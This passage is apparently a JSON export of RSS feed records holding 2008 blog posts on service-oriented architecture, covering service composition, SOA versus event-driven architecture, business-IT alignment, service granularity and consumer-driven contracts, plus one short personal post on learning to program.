 This is explained in more detail<a href=\"http://bill-poole.blogspot.com/2008/03/are-there-people-in-my-service.html\">here</a>.  This is a very important point.  Most discussions around SOA tend to describe services only as IT constructs.  A service consumer is unaware and does not care whether the service functionality is provided by people at a keyboard or software running on a server.<br /><br />In addition to the human resources, a service also will very likely contain software and hardware infrastructure.  The hardware infrastructure refers to the physical hardware on which the service operates - e.g. servers, SANs and communication infrastructure.<br /><br />The software infrastructure refers to software that supports the operation of the service, but doesn't implement the logic defined within the service domain.  So for example, this software would include operating systems, application platforms and communication software.<br /><br />The distinction between software infrastructure and service domain logic is an important one.  Software infrastructure can be reused between services, whereas logic related to the service domain should not be.  Domain logic should be implemented and deployed only once in one service.  Why?  Because otherwise we have low cohesion - a single concern addressed by multiple services - and that leads to coupling between services.<br /><br />So why can we reuse software infrastructure between services?  This is because such software is generic.  It doesn't pertain to any specific service domain.  Take UI rendering logic for instance.  The logic required for rendering a window doesn't relate to any specific domain addressed by any service in your business.<br /><br />Other examples of software infrastructure include rules engines and workflow systems.  However the rules and workflows themselves<i>would</i>constitute service domain logic.<br /><br />An interesting example is a CRM package.  A CRM package comes with quite a lot of what would seem to be domain logic.  For example, a CRM may be deployed in support of the Sales function of a business without a great deal of customisation.  Here, a large number of the native application features will directly contribute to the service domain.<br /><br />A CRM package does not however need to deal only with customers.  Most CRM packages can be highly customised to hold custom entities with complex relationships.  Custom logic can be added to the CRM package to implement specific business rules around these entities.  In this case the CRM package is being leveraged as an application platform, and as such is not implementing the domain logic of the service.<br /><br />Okay last but not least, we need to discuss the service information model and state.  Pretty much every service will have state.  That state will conform to the service information model and the service domain logic executes against that information model.  To that end, the service information model, state and domain logic are all indelibly linked.<br /><br />Note that any state leveraged by the software infrastructure is considered part of the infrastructure itself and not part of the service state in the above illustration.<br /><br />Just like service domain logic, the service state and information model should not be shared between services as it introduces coupling.  Services should share data only by way of message exchange, although this is not always possible when transforming an enterprise full of legacy applications to an SOA - at least initially; but more on that in a future post.<br /><br />So everything in blue in the above illustration is reusable between services.  The same people can participate in many services, and the same software and hardware infrastructure is reusable between services.  Everything else should not be directly reused as it introduces coupling and reduces cohesion.  Of course, domain logic within one service can be reused by other services through exchanging messages with that service.<br /><br />Okay well that sums up the basic elements of a service.  Stay tuned for my next post in this series!<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/WaVr7-qjpt8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1307}}
{"k":"0000000084","o":"0000002744","v":"001"}
{"_id":1308,"_uid":1308,"_dt":1373742620987,"_s":"532b7f3204713e436ccc29108a825885"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/l7DD_fs6EkA/soa-and-eda.html","title":"SOA and EDA","published":{"$wrap":"$date","v":1222419120002,"h":"2008-09-26T08:52:00.002Z"},"starred":false,"read":false,"content":"So far I've posted a large amount of material on SOA, pushing very heavily for an event driven approach - with specific attention to<i>business services</i>, where business-relevant events are surfaced as event messages published over a service bus.<br /><br />There has been an ongoing discussion in the public forum around the relationship between SOA and EDA (Event Driven Architecture). Are they in fact separate architectural styles?  Are they separate concerns?  Do they complement each other?  Does SOA subsume EDA?<br /><br />SOA and EDA are in fact separate architectural styles.  However they describe different concerns of an architecture.  They each bring their own benefits.  As such, it is possible (and in fact good practice) for the two styles to overlap.  An architecture can indeed both be service oriented<i>and</i>event driven.  Likewise it is possible for an architecture to be service oriented but not event driven, or event driven and not service oriented.  This is illustrated below.<br /><br /><a href=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s1600-h/SOA+and+EDA.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s400/SOA+and+EDA.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5250250730517127730\" /></a><br />An architecture consisting of services with no endpoints with a publish-subscribe binding conforms to the service oriented style of architecture, but is not event driven.  An architecture consisting of messages published over topics, but where there is no notion of services is event driven, but not service oriented.  For example, EAI can be achieved by having a number of applications publishing and subscribing over a set of topics, without explicitly defining any services, endpoints or service contracts.<br /><br />Where SOA and EDA come together, a topic corresponds to a specific endpoint of a specific service.  A topic cannot be shared between endpoints or services, and messages published onto a topic must conform to an explicitly defined service contract.  SOA brings benefits to EDA and vice versa.  Therefore we get the best result when the two architectural styles are combined.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/l7DD_fs6EkA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1308}}
{"k":"0000000084","o":"0000004440","v":"001"}
{"_id":1309,"_uid":1309,"_dt":1373742620987,"_s":"2a0d69da39ee4c01cb49ba6193e872cc"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/LxKn8FQGXww/service-composition-continued.html","title":"Service Composition (continued...)","published":{"$wrap":"$date","v":1221632820002,"h":"2008-09-17T06:27:00.002Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/09/service-composition.html\">last post</a>we talked about service composition in SOA.  Miguel posted a good<a href=\"https://www.blogger.com/comment.g?blogID=4338956765494283322&postID=2153814277876223807\">question</a>about whether composition in SOA is analogous with composition in Component Oriented Programming.  This really got me to thinking about whether composition actually has any real meaning in SOA at all.<br /><br />One of the key differences between components in Component Oriented Programming and services in SOA is that components must be<i>instantiated</i>.  A client must instantiate a component before the component is used.  Furthermore, multiple instances of a component can and usually do exist at the same time.<br /><br />Composition makes a lot of sense in Component Oriented Programming because we have one or more child components supporting a parent component.  Every new instance of the parent component contains new instances of the child components.<br /><br />Without instancing, composition wouldn't really make a great deal of sense in Component Oriented Programming.  Just because a component uses or references another component, doesn't make those components a composite.  What makes a set of components a composite is the lifetime of the child components being indelibly tied to that of the parent component.  The children are created with the parent and destroyed when the parent is destroyed.  The children have no purpose other than to meet the needs of the parent.<br /><br />SOA is a different ballgame however.  There is only ever one and only one instance of every service.  All services for all intents and purposes are always running (except for the odd moments of downtime) until those services are retired.  So what is a composite in SOA terms?  If I have a service A which consumes services B and C, is A a composite of B and C?  I would say no.  Otherwise all services in our enterprise would simply one big composite.<br /><br />I would suggest that composition in SOA refers to the bringing together of lower level services in order to support one or more higher level services.  It seems we need to have services at different levels in order for composition to make sense in SOA.  So if services B and C are lower level services that form part of the implementation of service A, then I would say that services B and C have been composed to form service A.<br /><br />As I mentioned in my last post, with all the hype around<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Models</a>, where lower level services (like task and entity services) are composed to form higher level process services, we see service composition taking centre stage in SOA discussions far more than it really should.<br /><br />As I've<a href=\"http://bill-poole.blogspot.com/2008/04/soa-and-reuse.html\">previously discussed</a>, the type of reuse central to Layered Service Models (functional reuse as opposed to reuse of events) doesn't really work very well in practice.  Functions exposed at the service level generally are too coarsely grained to be reused in different contexts.  As such, the notion of having a registry of lower level services that can be composed together in support of higher level services is somewhat flawed.<br /><br />We<i>may</i>have lower level services such as integration services, UI services or B2B services that support a higher level business service, but those lower level services should not be reused between the higher level services.  As such, in this case the service composition is really just an implementation detail of the higher level services and as such not really architecturally noteworthy.<br /><br />So I say again, service composition in SOA is only really a noteworthy concept if you're pursuing a Layered Service Model which as I've said before is not ideal.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/LxKn8FQGXww\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1309}}
{"k":"0000000084","o":"0000008083","v":"001"}
{"_id":1310,"_uid":1310,"_dt":1373742620987,"_s":"7512ca8be5f823841264947bd4d0348a"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/94uv3XlhB7Q/business-it-alignment.html","title":"Business-IT Alignment","published":{"$wrap":"$date","v":1218963060018,"h":"2008-08-17T08:51:00.018Z"},"starred":false,"read":false,"content":"<p>We hear the term (or should I call it buzz phrase?), business-IT alignment thrown around a lot these days - especially in SOA and Enterprise Architecture circles.  In fact business-IT alignment is commonly named as one of the key benefits of SOA (along with business agility, which is something I'll discuss in more detail in a future post).</p><p>So what is business-IT alignment, and why is it important?  What is all the fuss about?  Simply put, business-IT alignment is the extent to which<i>IT investments</i>are made in accordance with<i>business strategy</i>.  In the other direction, it is also the extent to which new technologies can be harnessed in order to<i>gain competitive advantage</i>.  Furthermore, it is also the extent to which the enterprise IT architecture aligns with and supports the enterprise business architecture.</p><p>A model for business-IT alignment is illustrated below.</p><br /><a href=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SKfm-y9Vt8I/AAAAAAAAAEE/a-kc1EF17P0/s1600-h/Business-IT+Alignment.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SKfm-y9Vt8I/AAAAAAAAAEE/a-kc1EF17P0/s400/Business-IT+Alignment.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5235407058346817474\" /></a><br /><p>The elements of this model are:</p><p><b>Business Strategy</b></p><p>Johnson and Scholes in their book<a href=\"http://www.amazon.co.uk/exec/obidos/ASIN/0273651129/tutor2u00\">Exploring Corporate Strategy</a>define strategy as \"the<b>direction</b>and<b>scope</b>of an organisation over the<b>long-term</b>: which achieves<b>advantage</b>for the organisation through its configuration of<b>resources</b>within a challenging<b>environment</b>, to meet the needs of<b>markets</b>and to fulfil<b>stakeholder</b>expectations.</p><p>Expanding on this, a business strategy identifies:<ul><li>The long term strategic objectives of the business</li><li>The markets in which the business should compete and the business functions required to do so</li><li>The ways in which those business functions can be performed in such a way to gain competitive advantage</li><li>The resources (people, skills, IP, technology, finance, etc) necessary in order to support the business functions and compete effectively</li><li>The external/environmental factors that influence the business's ability to compete effectively</li><li>The concerns, objectives and expectations of the various stakeholders (both internal and external) that have the power to influence the success of the business</li></ul></p><p><b>IT Strategy</b></p><p>As with business strategy, IT strategy involves identifying the long term view of the IT function of the business.  It identifies the<b>direction</b>and<b>scope</b>of the IT function over the long term in order to achieve<b>advantage</b>for the organisation through its configuration of<b>IT resources</b>within a challenging<b>environment</b>to meet the needs of<b>the business</b>and to fulfil<b>stakeholder</b>expectations.</p><p><b>Business Architecture</b></p><p>Business Architecture is the process of defining the business functions, processes, capabilities, services, roles and reporting relationships that make up a business.  Here, we are referring to Business Architecture applied at the enterprise level, rather than the solution level.</p><p><b>IT Architecture</b></p><p>IT Architecture is often expressed as Information Architecture, Application Architecture and Technology Architecture.  I'll describe these architecture domains in more detail in future posts.  In short, IT Architecture is the process of organising IT and information assets to support the business architecture and IT strategy.</p><br /><br /><p>Businesses that have strong business-IT alignment tend to have the following in common:<ul><li>IT investments can be directly linked to specific strategic business objectives.</li><li>The business drives all major IT initiatives in conjunction and cooperation with IT.</li><li>The business has an explicitly defined IT strategy which is directly linked to the business strategy.</li><li>IT is generally seen as an investment rather than an expense.</li><li>IT has direct representation in the executive leadership team and as such is present during business planning and strategy sessions.</li></ul></p><p>Most businesses today leverage IT only as a support mechanism.  IT is viewed as a cost centre - a means to an end, rather than a strategy enabler.  This is evidenced by the fact that many organisations do not have IT representation in the executive leadership team.</p><p>We see this commonly where the CFO belongs to the executive leadership team, and the CIO reports to the CFO.  In some organisations, the IT function is buried even further down in the hierarchy.  Business strategy is formulated without input from or support of IT.  IT is then involved as late as possible in the process only as a means of<i>executing</i>business strategy, rather than being involved in its<i>formulation</i>.</p><p>As a result of this ethos, IT has little to no visibility of the business strategy.  That is, IT has no visibility of the long term business plan or objectives.  Consequently, IT is limited to adding value<i>reactively</i>rather than<i>proactively</i>.  The IT function is directed to deliver systems with specific<i>tactical</i>scope, which although being part of a broader strategic vision doesn't give IT any visibility of that vision.</p><p>This results in the delivery of IT solutions that meet all the tactical requirements, but do not necessarily align with the long term strategic objectives of the organisation.</p><p>Furthermore, many organisations do not engage in Enterprise Business Architecture practices.  As such, there is no enterprise-wide functional view of the business.  Usually, there is only a structural view in the form of an organisation chart.  We usually find various business processes that have been documented with varying levels of detail, scope and accuracy, but no view as to how those processes fit into the bigger picture or how those processes support the business strategy.</p><p>As such, IT does not have the necessary information in order to formulate an effective enterprise IT architecture.  This only further forces IT down the road of acting tactically rather than strategically.  If IT has no view of the enterprise business architecture, then it cannot structure its IT assets optimally so that IT systems have high cohesion and loose coupling.</p><p>A result of delivering IT systems with only a tactical focus over an extended period of time is an enterprise IT architecture that is an unstructured mess with duplication of functionality (often manifested as many applications performing similar functions across the enterprise), suboptimal distribution of data, data locked in application silos, large numbers of complex and brittle interdependencies between systems, and poor performance and reliability of business critical IT systems.</p><p>Consequently we see an ever increasing percentage of IT budget being spent on maintaining the status quo, rather than being spent on investing in new capabilities that deliver new value to the enterprise.  Clearly this position is not sustainable in a competitive market.</p><p>One of the key ingredients in achieving business-IT alignment is an Enterprise Architecture program.  Businesses are already seeing significant returns from this investment, and time is running out for businesses that have not yet commenced engaging in this practice.</p><img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/94uv3XlhB7Q\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1310}}
{"k":"0000000084","o":"0000004380","v":"001"}
{"_id":1311,"_uid":1311,"_dt":1373742620987,"_s":"4a35e9989b3c3cc1e2b72b6d9375d3eb"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/719ViZa3CHU/service-composition.html","title":"Service Composition","published":{"$wrap":"$date","v":1221208260003,"h":"2008-09-12T08:31:00.003Z"},"starred":false,"read":false,"content":"Quite often we hear of service composition as one of the key benefits of the service oriented style of architecture.  With service composition, we are referring to the creation of new services from wiring up of existing services in new ways to deliver new value.<br /><br />According to the standard reading material, service composition is best achieved through<i>orchestration</i>.  This is usually achieved through the use of middleware such as an ESB or integration broker.  A workflow orchestrates the invocations of a number of services in order to achieve some particular outcome.<br /><br />As such, we find that a service may comprise some of its own logic (including the orchestration logic), as well as a number of lower level services.<br /><br />This concept of service composition is central to the<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Model</a>where lower level task and entity services are composed into higher level process services.  As you will have gleaned from my previous posts on the topic, I'm not a supporter of the Layered Service Model approach.  One of the issues of this approach is that lower level services are reused by many higher level services, resulting in high coupling between those higher level services.<br /><br />In the past, I have highly recommended that people pursue what I call a<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">Self-Contained Process-Centric Service Model</a>.  Here, services are centred around autonomous business functions such as Sales, Marketing and Billing.  What I probably didn't emphasise about this approach however is that it refers only to the top-level service model.  Each business service<i>may</i>be composed of lower level services.<br /><br />Note that these lower level services are not<i>business services</i>.  They are services that serve a particular function in support of the business service.  They are an implementation detail of the business service.  In fact, they are actually really just distributed components or integration points.  However if the means of communication with the distributed component or integration point is the exchange of messages via endpoints in conformance with a service contract, then we technically have a service by the strict definition of SOA.<br /><br />In a green fields implementation where the software supporting each business service is built from scratch, there may be no lower level services involved.  That is, there is no service composition.  Alternatively, the service software may be implemented with a smart client application that interacts with some back end components via the exchange of messages in conformance to a service contract.  Thus, those back end components technically expose a service to the smart client application.<br /><br />Say in support of this business service, the back end components also interact with a Web service provided by another organisation. Now we have another service added to the mix.  Here we can see services being composed in support of the larger business service.<br /><br />Where a business service is supported by a number of legacy applications we see even more composition.  When the business service receives a message, it must invoke one or more of these legacy applications appropriately.  This<i>may</i>be achieved by invoking Web services exposed by these applications, thus constituting further service composition.<br /><br />So we see that services certainly can be composed in support of larger services.  However I would hesitate to name this as a benefit of the SOA style of architecture.  It is merely an implementation choice of any given service.  Service composition has only come to be viewed by many as a key benefit of SOA due to the reuse promised (falsely in my opinion) by the Layered Service Model approach.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/719ViZa3CHU\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1311}}
{"k":"0000000084","o":"0000004005","v":"001"}
{"_id":1312,"_uid":1312,"_dt":1373742620988,"_s":"78c16ab62f97d9a09d376b0970cd5c8b"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/CaaUIxee4Ek/how-many-services.html","title":"How Many Services?","published":{"$wrap":"$date","v":1218036780001,"h":"2008-08-06T15:33:00.001Z"},"starred":false,"read":false,"content":"One of the questions I get asked rather frequently in my travels is how many services are appropriate in any given architecture?  Well this is one of those unfortunate situations where the answer is, it depends.  However there are some good rules of thumb that can lead you to determine whether you're on the right track in terms of defining your service model.<br /><br />In the field, the number of services we see in any given enterprise tends to vary wildly.  In some organisations there is only one service - theüberservice.  Other organisations have stated they have well over 10,000 services.  But how good are these architectures?  As I've<a href=\"http://bill-poole.blogspot.com/2008/05/soa-quality-spectrum.html\">previously stated</a>just because an architecture is service oriented doesn't make it good.<br /><br />We've discussed<a href=\"http://bill-poole.blogspot.com/2008/06/are-bad.html\">überservices</a>before and they are clearly not a good thing.  So we definitely want more than one service.  But 10,000?  How on earth did they achieve that figure?  Well at the end of the day the number of services you'll end up with is largely determined by the granularity of your services.  Fine grained services will result in more services than coarse grained services.  We've discussed<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">service granularity</a>before too.<br /><br />Ultimately the number of services you end up with will largely be determined by the flavour of SOA you pursue.  If you take the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>(not recommended), then you could end up with<i>any</i>number of services.  You're building services in a completely uncontrolled way that doesn't conform to any particular architecture.  Usually the longer you follow this path, the more services you'll end up with.  Hopefully you stop before you reach 10,000.<br /><br />If you go down the road of<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>then you'll end up with the same number of services as you have applications you are trying to integrate.  If you have 400 applications in your enterprise, you'll end up with 400 services.  Again, I wouldn't recommend this approach.<br /><br /><a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service models</a>have to take the prize in this competition.  Due to the incredible fine granularity of services in this model you can literally end up with thousands of services!  This is yet another reason why I wouldn't recommend this approach.<br /><br />And finally we have<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">self-contained process-centric service models</a>.  With this approach services are centred around process-centric cohesive business capabilities.  The number of services you will end up with will depend on the overall complexity of your business model.  But about 10-20 services is a good rule of thumb.  Any more than 30 or 40 and I'd be raising the alarm bells.<br /><br />Another thing to note is that the size of the organisation (in terms of staffing levels) is not a major factor in determining the appropriate number of services.  The number of services will grow as the complexity of the business model grows.  Keep in mind though that sometimes the complexity of the business must grow in order to cater for increased staffing levels.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/CaaUIxee4Ek\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1312}}
{"k":"0000000084","o":"0000004696","v":"001"}
{"_id":1313,"_uid":1313,"_dt":1373742620988,"_s":"8ab48f60aaa096bc979d650b64e0a453"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/iv4cQfcuzzw/service-oriented-car-wash.html","title":"The Service Oriented Car Wash","published":{"$wrap":"$date","v":1217864940002,"h":"2008-08-04T15:49:00.002Z"},"starred":false,"read":false,"content":"I recently had the pleasure of discovering that<a href=\"http://www.opengroup.org/\">The Open Group</a>have an<a href=\"http://www.opengroup.org/projects/soa/\">SOA Working Group</a>, the mission of which is \"to develop and foster common understanding of SOA in order to facilitate alignment between the business and information technology communities.\"  This is a very significant step in coming to a consensus on the definition of SOA in both the business and IT domains.<br /><br />The group is putting together an SOA ontology, which will hopefully go a long way towards creating a standard definition for the main elements of SOA and their relationships to each other.  The draft ontology in its current form makes reference to an example business scenario based on an imaginary car washing business.  The scenario is outlined below.<br /><br /><i>\"Joe has a one-man business. He stands on a street corner with a sponge, a bucket of water, and a sign saying \"Car Wash $5\". A customer drives up to him and asks him to wash the car. Joe asks the customer for five dollars. The customer gives him five dollars. Joe washes the car, then says, \"That's all done now,\" and the customer drives away.\"</i><br /><br />The Open Group at present states that this example identifies a single service, which embodies a single repeatable business activity performed by Joe - washing the car.  The customer is identified as the service consumer.  The customer \"consumes\" the service when he or she pays the five dollars for the car to be washed.<br /><br />There are however some issues with this model.  Firstly, the service identified in the model consists only of a single business activity. Services modelled this way are far too finely grained, thus resulting in low cohesion and high coupling between services.  A business service represents an entire cohesive business function, which may contain many processes and activities.<br /><br />Secondly, the service model completely omits the Sales function.  Although we are looking at a one man business, there are two business functions here (each of which translate to a business service).  There are two different processes at play here –<b>Sell Car Wash</b>, and<b>Wash Car</b>.  The<b>Sell Car Wash</b>process involves two roles – the Customer and the Salesperson.  The<b>Wash Car</b>process involves only one role – the Car Washer.  Joe just happens to hold two roles – the Salesperson and Car Washer roles.<br /><br />As the model as described by The Open Group consists only of one process, it is unclear as to whether their model follows an event driven paradigm.  Modelling the business architecture around business services and events provides for a far more loosely coupled and maintainable business architecture than other approaches.<br /><br />The example business scenario calls for a single end-to-end business process spanning two business services.  This is best represented as<i>two</i>business processes separately defined, but connected via a single<i>business event</i>which we might call<i>Sale Completed</i>.  This is the end event of the<b>Sell Car Wash</b>process and the begin event of the<b>Wash Car</b>process.  This is illustrated in the EPC diagram below.<br /><br /><a href=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s1600-h/Business+Architecture.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s400/Business+Architecture.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5230701681268849186\" /></a><br />Modelling our services this way has our Car Wash service as a consumer of our Sales service.  The customer is merely a participant in the Sales business service.  He or she is not a service consumer.<br /><br />Now although we could indeed model our business architecture as outlined by The Open Group, to do so would produce a Business Architecture with business processes spanning multiple business areas, thus having low cohesion.  This would produce a more unstable business architecture description and provide a poorer footing for our IT architecture.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/iv4cQfcuzzw\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1313}}
{"k":"0000000084","o":"0000003478","v":"001"}
{"_id":1314,"_uid":1314,"_dt":1373742620988,"_s":"afe9364ae66bed87c4828992cf4abfec"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/jQYtwn0ah3g/consumer-driven-contracts.html","title":"Consumer Driven Contracts","published":{"$wrap":"$date","v":1217951340004,"h":"2008-08-05T15:49:00.004Z"},"starred":false,"read":false,"content":"A while back a reader sent me an email asking about<i>consumer driven contracts</i>and how they fit into my stance on SOA.  I'd intended to share my thoughts on the approach with the rest of my readers but alas it slipped my mind.  Better late than never though, so I thought I'd take the opportunity to discuss the concept now.<br /><br />Consumer driven contracts as an approach is intended to provide inputs into the service provider's contract design to ensure relevance, as well as provide constraints on how a service provider's contract can evolve over time such that compatibility is maintained with consumers.<br /><br />However the intention should always be that the service provider contract evolves in such a way as to better express the concepts of the provider.  We don't want to reduce the semantic fidelity of communications with our services.<br /><br />I would say that as long as you're sticking mainly to publish-subscribe messaging (that is, avoiding command messages), then the needs of the consumer are considerably less relevant.  Consumers are only<i>informed</i>of events as they happen.  Command messages produce a subtle form of coupling where the service consumer<i>instructs</i>the service provider what to do.<br /><br />Services that publish events do not prescribe or assume what subscribed services will do (if anything) once a notification message is received.  An event message describes only an event that occurred within a service.  The subscribers should really have no influence on this.  As such, they should not be influencing the schema of the event messages published by the service provider.<br /><br />So when using publish-subscribe messaging, I would suggest that consumer contracts are useful only in providing constraints on what can be changed in the service provider's contract in order to maintain compatibility with its consumers.<br /><br />That being said, service contracts tend to be quite stable with<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">process-centric self-contained service models</a>- so I've not personally found consumer driven contracts worth the effort.<br /><br />Consumer driven contracts really come into their own with data-centric contracts and centralised data architectures.  When we always need to go and get our data from elsewhere, and all our service consumers use that data for different purposes, consumers have a substantial dependency on the service provider's schema.  They will likely need to influence the provider's schema quite regularly.  That in turn will affect the other consumers.<br /><br />This is yet another reason to pursue process-centric service contracts with decentralised data architectures.  It keeps your service contracts stable by virtue of minimising dependencies between service providers and consumers.  You can read more about service contract stability<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">here</a>.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/jQYtwn0ah3g\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1314}}
{"k":"0000000084","o":"0000003155","v":"001"}
{"_id":1315,"_uid":1315,"_dt":1373742620988,"_s":"9674224fc4b55395711d4779c0d11ff6"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/-RByDg-Aib4/how-did-you-get-started-in-software.html","title":"How Did You Get Started in Software Development?","published":{"$wrap":"$date","v":1216461660003,"h":"2008-07-19T10:01:00.003Z"},"starred":false,"read":false,"content":"Rhys Campbell<a href=\"http://rhysc.blogspot.com/2008/07/how-did-you-get-started-in-software.html\">tagged me recently</a>asking how I got started with developing software.  Although I don't personally write software these days, I've certainly done my share of it in the past and I currently manage Change Corporation's body of knowledge in the area.<br /><br />So let's get started:<br /><br /><b>How old were you when you started programming?</b><br /><br />I can't really remember it was so long ago.  But I think I was about 16 years old.  I started writing \"demos\", which were effectively programs that did various visual effects (like flying through tunnels and what have you).  The demos were entered into demo competitions.  Very nerdy really.<br /><br />I also wrote a music player application that played music stored in the S3M format.  If anyone can remember, that was the Scream Tracker file format.  The player was written in 80386 assembler and natively managed Expanded Memory (if anyone can remember that from the days of the 286 computer), hardware interrupts, and direct memory access (DMA).  The player did real time digital mixing.<br /><br /><b>What was your first programming language?</b><br /><br />I first started writing programs in C, but soon moved into 80386 assembler, and C++.  Eventually I got into Visual Objects, Visual Basic, Java and then C#.  I've also dabbled in Smalltalk and Eiffel.<br /><br /><b>What was the first real program you wrote?</b><br /><br />I suppose this question depends on the definition of \"real\".  The first commercial application I wrote was a consignment management system I think for a freight company.  It was so long ago I can't really remember - but it was written in Visual Objects.<br /><br /><b>If you knew then what you know now would you have started programming?</b><br /><br />Well I'm not really programming at all these days, so I guess if I knew then what I know now then I'd be doing Enterprise Architecture.  Although it would be hard to get businesses to take me seriously in that capacity as a 16 year old.  If I knew I would eventually end up doing Enterprise Architecture, then yes I would indeed have started programming as it eventually got me to where I wanted to be.<br /><br /><b>What’s the most fun you’ve ever had... programming?</b><br /><br />Hard to say.  There's always been good times and bad.  I can't say that I've ever found commercial programming<i>fun</i>exactly.  I've always found it rewarding and enjoyable.  I would say that the demo programs I wrote many years ago were fun to write.  I wasn't being paid for it, so they must have been. :-)<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/-RByDg-Aib4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1315}}
{"k":"0000000084","o":"0000003791","v":"001"}
{"_id":1316,"_uid":1316,"_dt":1373742620989,"_s":"33474d30e450c674b46b53db26831cf2"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/IBou74EiLjA/implementing-business-services.html","title":"Implementing Business Services","published":{"$wrap":"$date","v":1215936000004,"h":"2008-07-13T08:00:00.004Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/07/business-capabilities.html\">last post</a>we discussed business capabilities and how they form the basis of how we identify candidate business services.  But what is the physical manifestation of a business service?  Once we've determined the boundaries of our business services and their responsibilities, how do we go about implementing them?<br /><br />A business service is realised as a set of business processes and business rules, the people that perform those processes, the applications leveraged by those people in support of their roles in those business processes, the information leveraged by decision makers within those business processes, as well as the information as inputs and outputs of those processes, the semantics and structure of data held within the service, and the technology platforms on which the IT systems supporting the business service execute.<br /><br />Business processes in different services coordinate their activities via business events.  These business events define the interface (or service contracts) between business services.<br /><br />A business service may contain no IT systems whatsoever.  Where there<i>are</i>IT systems supporting a business service, they may not at all support the interface with the rest of the business.  A business event may be realised by a simple telephone call or a memo sent between people participating in different business services.<br /><br />Where IT systems<i>do</i>support the interface with the rest of the business, we have software components in different business services exchanging data.  In the SOA style of architecture, this data exchange is performed by way of exchanging explicitly defined messages in conformance with a service contract.<br /><br />Where we design our software components around business services (rather than taking the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS</a>,<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>or<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service Model</a>approach), business events are realised as event messages published onto our service bus.  The technical service contract then consists of the schema of the messages published by the service onto one or more topics.<br /><br />Inside the boundary of our business service, we may have one or more software components that exchange data via messages.  For example, a smart client application supporting a business service may interface with one or more back end components using SOAP based messages.<br /><br />These interactions that occur<i>behind</i>the service boundary are an implementation detail of the service itself.  These design aspects are local to the business service and as such do not influence the business service contract or play a part in the broader architecture.<br 